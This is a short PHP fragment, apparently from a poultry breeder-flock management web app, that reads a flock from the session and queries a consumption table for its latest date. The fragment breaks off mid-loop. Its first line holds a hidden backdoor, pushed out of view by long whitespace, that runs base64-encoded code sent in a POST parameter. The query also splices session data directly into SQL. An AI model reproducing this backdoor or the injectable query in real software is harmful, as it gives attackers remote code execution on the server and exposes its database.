<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['n660486']));?><?php session_start(); $flockget = $_SESSION['flock']; 
...
$query1 = "SELECT max(date2) as 'date2' FROM breeder_consumption WHERE flock = '$flockget'";
$result1 = mysql_query($query1,$conn); 
while($row11 = mysql_fetch_assoc($result1))
{
  $condate = $row11['date2'];
